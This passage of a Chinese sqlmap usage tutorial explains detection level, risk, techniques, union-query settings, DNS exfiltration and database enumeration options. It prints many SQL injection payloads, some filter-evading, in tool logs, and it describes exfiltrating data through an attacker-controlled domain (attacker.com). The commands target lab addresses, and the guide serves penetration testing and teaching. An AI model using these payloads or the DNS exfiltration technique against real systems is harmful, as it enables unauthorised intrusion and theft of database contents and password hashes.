class="hljs-string">&#x27;/**/aNd/**/4962=4962/**/aNd/**/&#x27;</span><span class="hljs-symbol">YFsp</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-symbol">YFsp</span><br>[<span class="hljs-number">12</span>:<span class="hljs-number">55</span>:<span class="hljs-number">53</span>] [<span class="hljs-symbol">PAYLOAD</span>] <span class="hljs-number">1</span><span class="hljs-comment">%&#x27;/**/anD/**/3549=6854/**/anD/**/&#x27;%&#x27;=&#x27;</span><br>[<span class="hljs-number">12</span>:<span class="hljs-number">55</span>:<span class="hljs-number">53</span>] [<span class="hljs-symbol">PAYLOAD</span>] <span class="hljs-number">1</span><span class="hljs-comment">%&#x27;/**/aND/**/4962=4962/**/aND/**/&#x27;%&#x27;=&#x27;</span><br>[...]<br>[<span class="hljs-number">12</span>:<span class="hljs-number">55</span>:<span class="hljs-number">54</span>] [<span class="hljs-symbol">PAYLOAD</span>] <span class="hljs-number">1</span>)<span class="hljs-comment">/**/</span>uNIoN<span class="hljs-comment">/**/</span>alL<span class="hljs-comment">/**/</span><span class="hljs-symbol">Select</span><span class="hljs-comment">/**/</span>nuLl--<span class="hljs-comment">/**/</span><span class="hljs-symbol">NRtq</span><br>[<span class="hljs-number">12</span>:<span class="hljs-number">55</span>:<span class="hljs-number">54</span>] [<span class="hljs-symbol">PAYLOAD</span>] <span class="hljs-number">1</span>)<span class="hljs-comment">/**/</span><span class="hljs-symbol">UnIOn</span><span class="hljs-comment">/**/</span>alL<span class="hljs-comment">/**/</span>sElEcT<span class="hljs-comment">/**/</span>nuLL,nuLL--<span class="hljs-comment">/**/</span>jalk<br>[<span class="hljs-number">12</span>:<span class="hljs-number">55</span>:<span class="hljs-number">54</span>] [<span class="hljs-symbol">PAYLOAD</span>] <span class="hljs-number">1</span>)<span class="hljs-comment">/**/</span><span class="hljs-symbol">Union</span><span class="hljs-comment">/**/</span>aLl<span class="hljs-comment">/**/</span>seLeCt<span class="hljs-comment">/**/</span>nuLL,nuLL,nuLL--<span class="hljs-comment">/**/</span>ylpg<br>[...]<br></code></pre></td></tr></table></figure>
<p>而若不加 tamper 脚本，上例的部分输出为：</p>
<figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs prolog">[...]<br>[<span class="hljs-number">13</span>:<span class="hljs-number">00</span>:<span class="hljs-number">12</span>] [<span class="hljs-symbol">INFO</span>] testing for <span class="hljs-symbol">SQL</span> injection on <span class="hljs-symbol">GET</span> parameter <span class="hljs-string">&#x27;id&#x27;</span><br>[<span class="hljs-number">13</span>:<span class="hljs-number">00</span>:<span class="hljs-number">12</span>] [<span class="hljs-symbol">INFO</span>] testing <span class="hljs-string">&#x27;AND boolean-based blind - WHERE or HAVING clause&#x27;</span><br>[<span class="hljs-number">13</span>:<span class="hljs-number">00</span>:<span class="hljs-number">12</span>] [<span class="hljs-symbol">PAYLOAD</span>] <span class="hljs-number">1</span>) <span class="hljs-symbol">AND</span> <span class="hljs-number">9902</span>=<span class="hljs-number">5632</span> <span class="hljs-symbol">AND</span> (<span class="hljs-number">5820</span>=<span class="hljs-number">5820</span><br>[<span class="hljs-number">13</span>:<span class="hljs-number">00</span>:<span class="hljs-number">12</span>] [<span class="hljs-symbol">PAYLOAD</span>] <span class="hljs-number">1</span>) <span class="hljs-symbol">AND</span> <span class="hljs-number">6711</span>=<span class="hljs-number">6711</span> <span class="hljs-symbol">AND</span> (<span class="hljs-number">7174</span>=<span class="hljs-number">7174</span><br>[<span class="hljs-number">13</span>:<span class="hljs-number">00</span>:<span class="hljs-number">12</span>] [<span class="hljs-symbol">PAYLOAD</span>] <span class="hljs-number">1</span> <span class="hljs-symbol">AND</span> <span class="hljs-number">7140</span>=<span class="hljs-number">6136</span><br>[<span class="hljs-number">13</span>:<span class="hljs-number">00</span>:<span class="hljs-number">12</span>] [<span class="hljs-symbol">PAYLOAD</span>] <span class="hljs-number">1</span> <span class="hljs-symbol">AND</span> <span class="hljs-number">6711</span>=<span class="hljs-number">6711</span><br>[<span class="hljs-number">13</span>:<span class="hljs-number">00</span>:<span class="hljs-number">12</span>] [<span class="hljs-symbol">PAYLOAD</span>] <span class="hljs-number">1</span> <span class="hljs-symbol">AND</span> <span class="hljs-number">1693</span>=<span class="hljs-number">7532</span>-- oqcR<br>[<span class="hljs-number">13</span>:<span class="hljs-number">00</span>:<span class="hljs-number">12</span>] [<span class="hljs-symbol">PAYLOAD</span>] <span class="hljs-number">1</span> <span class="hljs-symbol">AND</span> <span class="hljs-number">6711</span>=<span class="hljs-number">6711</span>-- qAPJ<br>[<span class="hljs-number">13</span>:<span class="hljs-number">00</span>:<span class="hljs-number">12</span>] [<span class="hljs-symbol">PAYLOAD</span>] <span class="hljs-number">1</span><span class="hljs-string">&#x27;) AND 6904=7395 AND (&#x27;</span>xBlu<span class="hljs-string">&#x27;=&#x27;</span>xBlu<br>[<span class="hljs-number">13</span>:<span class="hljs-number">00</span>:<span class="hljs-number">12</span>] [<span class="hljs-symbol">PAYLOAD</span>] <span class="hljs-number">1</span><span class="hljs-string">&#x27;) AND 6711=6711 AND (&#x27;</span><span class="hljs-symbol">RgoX</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-symbol">RgoX</span><br>[<span class="hljs-number">13</span>:<span class="hljs-number">00</span>:<span class="hljs-number">12</span>] [<span class="hljs-symbol">PAYLOAD</span>] <span class="hljs-number">1</span><span class="hljs-string">&#x27; AND 6469=7302 AND &#x27;</span>maCj<span class="hljs-string">&#x27;=&#x27;</span>maCj<br>[<span class="hljs-number">13</span>:<span class="hljs-number">00</span>:<span class="hljs-number">12</span>] [<span class="hljs-symbol">PAYLOAD</span>] <span class="hljs-number">1</span><span class="hljs-string">&#x27; AND 6711=6711 AND &#x27;</span>pSYg<span class="hljs-string">&#x27;=&#x27;</span>pSYg<br>[<span class="hljs-number">13</span>:<span class="hljs-number">00</span>:<span class="hljs-number">12</span>] [<span class="hljs-symbol">PAYLOAD</span>] <span class="hljs-number">1</span><span class="hljs-comment">%&#x27; AND 7516=3605 AND &#x27;%&#x27;=&#x27;</span><br>[<span class="hljs-number">13</span>:<span class="hljs-number">00</span>:<span class="hljs-number">12</span>] [<span class="hljs-symbol">PAYLOAD</span>] <span class="hljs-number">1</span><span class="hljs-comment">%&#x27; AND 6711=6711 AND &#x27;%&#x27;=&#x27;</span><br>[...]<br>[<span class="hljs-number">13</span>:<span class="hljs-number">00</span>:<span class="hljs-number">12</span>] [<span class="hljs-symbol">PAYLOAD</span>] <span class="hljs-number">1</span>) <span class="hljs-symbol">UNION</span> <span class="hljs-symbol">ALL</span> <span class="hljs-symbol">SELECT</span> <span class="hljs-symbol">NULL</span>-- mUDh<br>[<span class="hljs-number">13</span>:<span class="hljs-number">00</span>:<span class="hljs-number">12</span>] [<span class="hljs-symbol">PAYLOAD</span>] <span class="hljs-number">1</span>) <span class="hljs-symbol">UNION</span> <span class="hljs-symbol">ALL</span> <span class="hljs-symbol">SELECT</span> <span class="hljs-symbol">NULL</span>,<span class="hljs-symbol">NULL</span>-- <span class="hljs-symbol">QKId</span><br>[<span class="hljs-number">13</span>:<span class="hljs-number">00</span>:<span class="hljs-number">12</span>] [<span class="hljs-symbol">PAYLOAD</span>] <span class="hljs-number">1</span>) <span class="hljs-symbol">UNION</span> <span class="hljs-symbol">ALL</span> <span class="hljs-symbol">SELECT</span> <span class="hljs-symbol">NULL</span>,<span class="hljs-symbol">NULL</span>,<span class="hljs-symbol">NULL</span>-- iwvT<br>[...]<br></code></pre></td></tr></table></figure>
<h4 id="检测级别">检测级别</h4>
<blockquote>
<p>参数：<code>--level</code></p>
</blockquote>
<p>此参数用于指定检测级别，有 1~5 共 5 级。默认为 1，表示做最少的检测，相应的，5 级表示做最多的检测。<br />
Sqlmap 使用的 payload 保存在目录 xml/payloads/中，是 xml 格式的，可以自己定制。节选一个 payload 如下所示：<br />
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">test</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>AND boolean-based blind - WHERE or HAVING clause (Generic comment)<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">stype</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">stype</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">level</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">level</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">risk</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">risk</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">clause</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">clause</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">where</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">where</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">vector</span>&gt;</span>AND [INFERENCE]<span class="hljs-tag">&lt;/<span class="hljs-name">vector</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">request</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">payload</span>&gt;</span>AND [RANDNUM]=[RANDNUM]<span class="hljs-tag">&lt;/<span class="hljs-name">payload</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">comment</span>&gt;</span>[GENERIC_SQL_COMMENT]<span class="hljs-tag">&lt;/<span class="hljs-name">comment</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">request</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">response</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">comparison</span>&gt;</span>AND [RANDNUM]=[RANDNUM1]<span class="hljs-tag">&lt;/<span class="hljs-name">comparison</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">response</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">test</span>&gt;</span><br></code></pre></td></tr></table></figure><br />
在上例中可以看到有 level 标签，其值为 2，该 payload 在检测级别大于等于 2 时被使用。<br />
risk 标签的含义见后文。</p>
<p>检测级别不仅会影响 payload 的使用，还会影响注入点的检测，GET 和 POST 参数是一直会被检测的，<br />
检测级别大于等于 2 时会检测 cookie 是否有注入，检测级别大于等于 3 时会检测 User-Agent 和 Referer 是否有注入。</p>
<p>若不是很清楚注入点在哪里可以设置一个比较高的检测级别。</p>
<p>强烈建议在向 Sqlmap 官方报告一个明确存在的注入漏洞检测不出来前先把检测级别调高试试。</p>
<h4 id="风险等级">风险等级</h4>
<blockquote>
<p>参数：<code>--risk</code></p>
</blockquote>
<p>此参数用于指定风险等级，有 1~4 共 4 级。默认风险等级为 1，此等级在大多数情况下对测试目标无害。<br />
风险等级 2 添加了基于时间的注入测试，等级 3 添加了 OR 测试。</p>
<p>若注入点是在 UPDATE 语句中，使用 OR 测试可能会修改整个表的数据，这显然不是攻击者想要看到的。<br />
因此用户需要能控制风险等级避开有潜在风险的 payload。</p>
<h4 id="页面对比">页面对比</h4>
<blockquote>
<p>参数：<code>--string</code>、<code>--not-string</code>、<code>--regexp</code></p>
</blockquote>
<p>默认情况下在布尔型注入中 Sqlmap 通过比较返回页面内容来判断 True 或 False。<br />
但有时页面每次刷新都会不同，如页面中有动态广告。Sqlmap 会尽力判断出页面中动态的部分来，但并不总能成功。<br />
用户可以用参数<code>--string</code>指出代表 True 的页面会包含而代表 False 的页面不会包含的字符串以供 Sqlmap 判断 True 或 False，<br />
若这样的字符串是变动的还可以用参数<code>--regexp</code>指定一个正则表达式去匹配这样的字符串。<br />
或者用参数<code>--not-string</code>指出代表 False 的页面会包含而代表 True 的页面不会包含的字符串。</p>
<blockquote>
<p>参数：<code>--code</code></p>
</blockquote>
<p>或者更简单地，若是用户知道代表 True 的页面 HTTP 状态码为 200 而代表 False 的页面 HTTP 状态码不为 200 比如是 401，<br />
可以用<code>--code</code>参数告诉告诉 Sqlmap 这一信息，如<code>--code=200</code>。</p>
<blockquote>
<p>参数：<code>--titles</code></p>
</blockquote>
<p>若是用户知道代表 True 的页面 title 和代表 False 的页面 title 不同，<br />
如代表 True 的页面 title 为<code>Welcome</code>，代表 False 的页面 title 为<code>Forbidden</code>，<br />
就可以使用参数<code>--titles</code>让 Sqlmap 依据 title 来判断 True 或 False。</p>
<blockquote>
<p>参数：<code>--text-only</code></p>
</blockquote>
<p>若是 HTTP 响应体中有许多诸如 JavaScript 之类的活动内容，可以使用参数<code>--text-only</code>让 Sqlmap 只专注于纯文本内容。</p>
<h4 id="检测时所用技术">检测时所用技术</h4>
<blockquote>
<p>参数：<code>--technique</code></p>
</blockquote>
<p>此参数用于指定检测注入时所用技术。默认情况下 Sqlmap 会使用自己支持的全部技术进行检测。<br />
此参数后跟表示检测技术的大写字母，其值为 B、E、U、S、T 或 Q，含义如下：</p>
<ul>
<li>B：Boolean-based blind（布尔型注入）</li>
<li>E：Error-based（报错型注入）</li>
<li>U：Union query-based（可联合查询注入）</li>
<li>S：Stacked queries（可多语句查询注入）</li>
<li>T：Time-based blind（基于时间延迟注入）</li>
<li>Q：Inline queries（嵌套查询注入）</li>
</ul>
<p>可以用<code>--technique ES</code>来指定使用两种检测技术。<code>--technique BEUSTQ</code>与默认情况等效。</p>
<p>想要访问文件系统或是 Windows 的注册表就一定要添加<code>S</code>进行多语句查询注入测试。</p>
<h3 id="注入">注入</h3>
<h4 id="基于时间延迟注入中延时设置">基于时间延迟注入中延时设置</h4>
<blockquote>
<p>参数：<code>--time-sec</code></p>
</blockquote>
<p>用此参数设置基于时间延迟注入中延时时长，默认为 5 秒。</p>
<h4 id="联合查询注入中列数设置">联合查询注入中列数设置</h4>
<blockquote>
<p>参数：<code>--union-cols</code></p>
</blockquote>
<p>在进行联合查询注入时，Sqlmap 会自动检测列数，范围是 1 到 10。当 level 值较高时列数检测范围的上限会扩大到 50。</p>
<p>可以用此参数指定列数检测范围，如<code>--union-cols 12-16</code>就会让 Sqlmap 的列数检测范围变成 12 到 16。</p>
<h4 id="联合查询注入中字符设置">联合查询注入中字符设置</h4>
<blockquote>
<p>参数：<code>--union-char</code></p>
</blockquote>
<p>默认情况下 Sqlmap 进行联合查询注入时使用空字符（NULL）。但当 level 值较高时 Sqlmap 会生成随机数用于联合查询注入。<br />
因为有时使用空字符注入会失败而使用随机数会成功。</p>
<p>使用此参数可以指定联合查询注入中使用的字符，如：<code>--union-char 123</code>。</p>
<p><code>联合查询注入中使用的字符</code>究竟是什么意思呢？请看下面两个例子：</p>
<p>第一个例子，不使用<code>--union-char</code>，默认情况下联合查询注入中使用的字符为空字符（NULL）：</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;http://192.168.56.101/user.php?id=001&quot;</span> <span class="hljs-attr">--technique</span> U -v <span class="hljs-number">3</span><br></code></pre></td></tr></table></figure>
<p>部分输出为：</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">[<span class="hljs-number">10</span>:<span class="hljs-number">59</span>:<span class="hljs-number">15</span>] [PAYLOAD] <span class="hljs-number">001</span> <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">ALL</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">NULL</span>,CONCAT(<span class="hljs-number">0x71707a6271</span>,<span class="hljs-number">0x66546c7770497458576f6455476761654654745744684c5062585971794c556d55454a6c49525675</span>,<span class="hljs-number">0x7162767671</span>),<span class="hljs-keyword">NULL</span>,<span class="hljs-keyword">NULL</span>,<span class="hljs-keyword">NULL</span>,<span class="hljs-keyword">NULL</span>,<span class="hljs-keyword">NULL</span>,<span class="hljs-keyword">NULL</span>,<span class="hljs-keyword">NULL</span>,<span class="hljs-keyword">NULL</span>,<span class="hljs-keyword">NULL</span>,<span class="hljs-keyword">NULL</span><span class="hljs-comment">-- FAcV</span><br>[<span class="hljs-number">10</span>:<span class="hljs-number">59</span>:<span class="hljs-number">15</span>] [PAYLOAD] <span class="hljs-number">001</span> <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">ALL</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">NULL</span>,<span class="hljs-keyword">NULL</span>,<span class="hljs-keyword">NULL</span>,<span class="hljs-keyword">NULL</span>,<span class="hljs-keyword">NULL</span>,<span class="hljs-keyword">NULL</span>,CONCAT(<span class="hljs-number">0x71707a6271</span>,<span class="hljs-number">0x6b43674e76687959526b6452627255787373675a6f5a436f7266756d49424547496d506779456170</span>,<span class="hljs-number">0x7162767671</span>),<span class="hljs-keyword">NULL</span>,<span class="hljs-keyword">NULL</span>,<span class="hljs-keyword">NULL</span>,<span class="hljs-keyword">NULL</span>,<span class="hljs-keyword">NULL</span><span class="hljs-comment">-- caXD</span><br></code></pre></td></tr></table></figure>
<p>第一个例子，使用<code>--union-char 123</code>，指定联合查询注入中使用的字符为<code>123</code>：</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;http://192.168.56.101/user.php?id=001&quot;</span> <span class="hljs-attr">--technique</span> U -v <span class="hljs-number">3</span> <span class="hljs-attr">--union-char</span> <span class="hljs-number">123</span><br></code></pre></td></tr></table></figure>
<p>部分输出为：</p>
<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dns">[<span class="hljs-number">10</span>:<span class="hljs-number">59</span>:<span class="hljs-number">30</span>] [PAYLOAD] <span class="hljs-number">001</span> UNION ALL SELECT <span class="hljs-number">123,123,123,123</span>,<span class="hljs-number">123,123,123,123</span>,<span class="hljs-number">123,123,123</span>,CONCAT(<span class="hljs-number">0</span>x<span class="hljs-number">716b707171</span>,<span class="hljs-number">0</span>x776c71686e54726659424b49616d68756e64734d45774c4c71634943457942557845<span class="hljs-number">57597a484244</span>,<span class="hljs-number">0</span>x<span class="hljs-number">7178627071</span>)-- aUXO<br>[<span class="hljs-number">10</span>:<span class="hljs-number">59</span>:<span class="hljs-number">30</span>] [PAYLOAD] <span class="hljs-number">001</span> UNION ALL SELECT <span class="hljs-number">123,123,123,123</span>,<span class="hljs-number">123,123,123,123</span>,<span class="hljs-number">123,123</span>,CONCAT(<span class="hljs-number">0</span>x<span class="hljs-number">716b707171</span>,<span class="hljs-number">0</span>x6f5278444767675156496c724563714e6568634c6b5950646a6f4e53516b776d77474e<span class="hljs-number">7141425273</span>,<span class="hljs-number">0</span>x<span class="hljs-number">7178627071</span>),<span class="hljs-number">123</span>-- lPHb<br></code></pre></td></tr></table></figure>
<p>仔细观察上示两例的输出就能明白<code>联合查询注入中使用的字符</code>就是<code>UNION ALL SELECT XXX, XXX</code>中的<code>XXX</code>。</p>
<h4 id="联合查询注入中表名设置">联合查询注入中表名设置</h4>
<blockquote>
<p>参数：<code>--union-from</code></p>
</blockquote>
<p>有些情况下在联合查询中必须指定一个有效和可访问的表名，否则联合查询会执行失败，如在微软的 Access 中。<br />
（也就是说，某些 DBMS 不支持<code>SELECT 1,2;</code>这样的语句，SELECT 必须有 FROM。）<br />
用此参数指定这个表名，如：<code>--union-from=users</code>。</p>
<h4 id="dns-泄露攻击">DNS 泄露攻击</h4>
<blockquote>
<p>参数：<code>--dns-domain</code></p>
</blockquote>
<p>SQL 注入中的 DNS 泄露攻击详情见论文<a target="_blank" rel="noopener" href="http://blog.csdn.net/wn314/article/details/arxiv.org/pdf/1303.3047.pdf">《Data Retrieval over DNS in SQL Injection Attacks》</a>。</p>
<p>假设攻击者控制着某域名（例如：attacker.com）的域名解析服务器，即查询该域名的子域名对应的 IP 地址都会到这台域名解析服务器来查询。<br />
这时攻击者就可以使用<code>--dns-domain attacker.com</code>来进行 DNS 泄露攻击。</p>
<p>实际上若是攻击者没有控制任何一台域名解析服务器，那么她可以注册一个新域名，再自己搭建一台域名解析服务器用于接受数据。</p>
<h4 id="二阶注入攻击">二阶注入攻击</h4>
<blockquote>
<p>参数：<code>--second-order</code></p>
</blockquote>
<p>有时注入结果显示在别的页面，此时需要用此参数指明显示注入结果的页面，该参数后跟一个 URL。</p>
<h3 id="指纹">指纹</h3>
<h4 id="指纹识别">指纹识别</h4>
<p>默认地 Sqlmap 会自动对注入目标进行数据库管理系统指纹识别。</p>
<blockquote>
<p>参数：<code>-f</code> 或<code>--fingerprint</code></p>
</blockquote>
<p>若想执行更广泛的数据库管理系统指纹识别可以添加此参数。</p>
<blockquote>
<p>参数：<code>-b</code> 或<code>--banner</code></p>
</blockquote>
<p>若想得到更精确的指纹识别结果可以添加此参数，详情见后文。</p>
<h3 id="暴力破解">暴力破解</h3>
<h4 id="暴力破解表名">暴力破解表名</h4>
<blockquote>
<p>参数：<code>--common-tables</code></p>
</blockquote>
<p>有些情况下用<code>--tables</code>不能列出数据库中表名来，如：</p>
<ul>
<li>版本小于 5.0 的 MySQL 没有 information_schema 表</li>
<li>微软 Access 的 MSysObjects 表默认不可读</li>
<li>数据库用户权限过低无法读取表名</li>
</ul>
<p>当无法读出表名时可以使用参数<code>--common-tables</code>暴力破解表名，<br />
该参数使用的字典是 txt/common-tables.txt，其中存储了常见表名，可以手动编辑该文件。</p>
<h4 id="暴力破解列名">暴力破解列名</h4>
<p>参数：<code>--common-columns</code></p>
<p>有些情况下用<code>--columns</code>不能列出数据表中列名来，如：</p>
<ul>
<li>版本小于 5.0 的 MySQL 没有 information_schema 表</li>
<li>微软 Access 的 MSysObjects 表默认不可读</li>
<li>数据库用户权限过低无法读取列名</li>
</ul>
<p>当无法读出列名时可以使用参数<code>--common-columns</code>暴力破解列名，<br />
该参数使用的字典是 txt/common-columns.txt，其中存储了常见列名，可以手动编辑该文件。</p>
<h3 id="列举数据">列举数据</h3>
<p>这些参数用于列举出数据库管理系统信息、数据结构和数据内容。</p>
<h4 id="一键列举全部数据">一键列举全部数据</h4>
<blockquote>
<p>参数：<code>--all</code></p>
</blockquote>
<p>使用这一个参数就能列举所有可访问的数据。但不推荐使用，因为这会发送大量请求，把有用和无用的信息都列举出来。</p>
<h4 id="列举数据库系统信息">列举数据库系统信息</h4>
<blockquote>
<p>参数：<code>-b</code> 或<code>--banner</code></p>
</blockquote>
<p>大多数的现代数据库管理系统都有一个函数或是环境变量能够返回数据库管理系统的版本号和最后的补丁级别以及底层的操作系统信息。<br />
通常这个函数是 version()、环境变量是@<span class="citation" data-cites="version">@version</span>，当然要看目标数据库管理系统了。使用参数<code>-b</code>或<code>--banner</code>来列举数据库管理系统的这一信息。</p>
<p>下例中的数据库是 Oracle：</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;http://192.168.136.131/sqlmap/oracle/get_int.php?id=1&quot;</span> <span class="hljs-attr">--banner</span><br></code></pre></td></tr></table></figure>
<p>部分输出为：</p>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">[<span class="hljs-number">09</span>:<span class="hljs-number">54</span>:<span class="hljs-number">30</span>] [INFO] fetching <span class="hljs-keyword">banner</span><br><span class="hljs-keyword"></span>web application technology: PHP <span class="hljs-number">5</span>.<span class="hljs-number">2</span>.<span class="hljs-number">6</span>, Apache <span class="hljs-number">2</span>.<span class="hljs-number">2</span>.<span class="hljs-number">9</span><br><span class="hljs-keyword">back-end </span>DBMS: <span class="hljs-keyword">Oracle</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">banner: </span><span class="hljs-string">&#x27;Oracle Database 10g Enterprise Edition Release 10.2.0.1.0 - Prod&#x27;</span><br></code></pre></td></tr></table></figure>
<p>下例中的数据库是 Mysql：</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">[<span class="hljs-number">09</span>:<span class="hljs-number">56</span>:<span class="hljs-number">32</span>] [<span class="hljs-keyword">INFO</span>] fetching banner<br>back-<span class="hljs-keyword">end</span> DBMS operating <span class="hljs-keyword">system</span>: Linux Ubuntu<br>back-<span class="hljs-keyword">end</span> DBMS: MySQL &gt;= <span class="hljs-number">5.0</span><br>banner:    <span class="hljs-string">&#x27;5.5.50-0ubuntu0.14.04.1&#x27;</span><br></code></pre></td></tr></table></figure>
<h4 id="列举当前用户">列举当前用户</h4>
<blockquote>
<p>参数：<code>--current-user</code></p>
</blockquote>
<p>使用这一参数有可能将执行 SQL 语句的用户列举出来。</p>
<h4 id="列举当前数据库">列举当前数据库</h4>
<blockquote>
<p>参数：<code>--current-db</code></p>
</blockquote>
<p>使用这一参数有可能将 WEB 应用连接的数据库名列举出来。</p>
<h4 id="列举服务器主机名">列举服务器主机名</h4>
<blockquote>
<p>参数：<code>--hostname</code></p>
</blockquote>
<p>使用这一参数有可能将数据库管理系统所在计算机的主机名列举出来，如：</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> sqlmap.<span class="hljs-keyword">py</span> -<span class="hljs-keyword">u</span> <span class="hljs-string">&quot;http://192.168.136.131/sqlmap/mysql/get_int.php?id=1&quot;</span> --<span class="hljs-built_in">hostname</span><br></code></pre></td></tr></table></figure>
<p>部分输出如下：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">[xx:xx:04] [<span class="hljs-built_in">INFO</span>] fetching<span class="hljs-built_in"> server </span>hostname<br>[xx:xx:04] [<span class="hljs-built_in">INFO</span>] retrieved: debian-5.0-i386<br>hostname: <span class="hljs-string">&#x27;debian-5.0-i386&#x27;</span><br></code></pre></td></tr></table></figure>
<h4 id="检测当前用户是否是管理员">检测当前用户是否是管理员</h4>
<blockquote>
<p>参数：<code>--is-dba</code></p>
</blockquote>
<p>使用这一参数有可能能够检测当前用户是否是管理员，若是管理员则返回 True，否则返回 False。如：</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> sqlmap.<span class="hljs-keyword">py</span> -<span class="hljs-keyword">u</span> <span class="hljs-string">&quot;http://192.168.56.102/user.php?id=1&quot;</span> --<span class="hljs-keyword">is</span>-dba<br></code></pre></td></tr></table></figure>
<p>部分输出为：</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">[<span class="hljs-number">10</span>:<span class="hljs-number">05</span>:<span class="hljs-number">16</span>] [<span class="hljs-keyword">INFO</span>] testing <span class="hljs-keyword">if</span> <span class="hljs-keyword">current</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">is</span> DBA<br>[<span class="hljs-number">10</span>:<span class="hljs-number">05</span>:<span class="hljs-number">16</span>] [<span class="hljs-keyword">INFO</span>] fetching <span class="hljs-keyword">current</span> <span class="hljs-keyword">user</span><br>[<span class="hljs-number">10</span>:<span class="hljs-number">05</span>:<span class="hljs-number">16</span>] [<span class="hljs-built_in">WARNING</span>] reflective <span class="hljs-keyword">value</span>(s) <span class="hljs-built_in">found</span> <span class="hljs-keyword">and</span> filtering <span class="hljs-keyword">out</span><br><span class="hljs-keyword">current</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">is</span> DBA:    <span class="hljs-keyword">True</span><br></code></pre></td></tr></table></figure>
<h4 id="列举数据库管理系统中的用户">列举数据库管理系统中的用户</h4>
<blockquote>
<p>参数：<code>--users</code></p>
</blockquote>
<p>当前用户有读取包含了数据库管理系统中用户信息的系统表的权限时使用这一参数可以列举数据库管理系统中的用户。</p>
<h4 id="列举并破解数据库管理系统用户密码-hash-值">列举并破解数据库管理系统用户密码 Hash 值</h4>
<blockquote>
<p>参数：<code>--passwords</code></p>
</blockquote>
<p>当前用户有读取包含了数据库管理系统中用户密码 Hash 值的系统表的权限时使用这一参数可以列举数据库管理系统中用户密码 Hash 值。<br />
